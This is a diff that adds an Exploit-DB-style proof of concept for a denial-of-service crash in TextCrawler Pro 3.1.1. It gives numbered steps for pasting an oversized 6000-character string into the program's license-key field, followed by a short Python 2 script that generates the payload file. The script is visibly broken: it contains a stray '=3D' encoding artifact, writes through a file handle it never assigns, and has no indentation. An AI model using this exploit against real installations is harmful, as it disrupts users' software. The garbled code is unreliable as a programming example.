@@ -1,0 +1,28 @@
+# Exploit Title: TextCrawler Pro3.1.1 - Denial of Service (PoC)
+# Date: 2020-05-01
+# Vendor Homepage:https://www.digitalvolcano.co.uk/index.html
+# Software Link:  https://www.digitalvolcano.co.uk/download/TextCrawlerPro=setup.exe
+# Exploit Author: Achilles
+# Tested Version: 3.1.1
+# Tested on: Windows 7 x64
+
+
+# 1.- Run python code :TextCrawler.py
+# 2.- Open EVIL.txt and copy content to clipboard
+# 3.- Open TextCrawler Pro
+# 4.- Paste the content of EVIL.txt into the Field: 'License key'
+# 5.- Click 'Activate' and you will see a crash.
+
+
+
+#!/usr/bin/env python
+buffer =3D "\x41" * 6000
+
+try:
+open("Evil.txt","w")
+print "[+] Creating %s bytes evil payload.." %len(buffer)
+f.write(buffer)
+f.close()
+print "[+] File created!"
+except:
+print "File cannot be created"
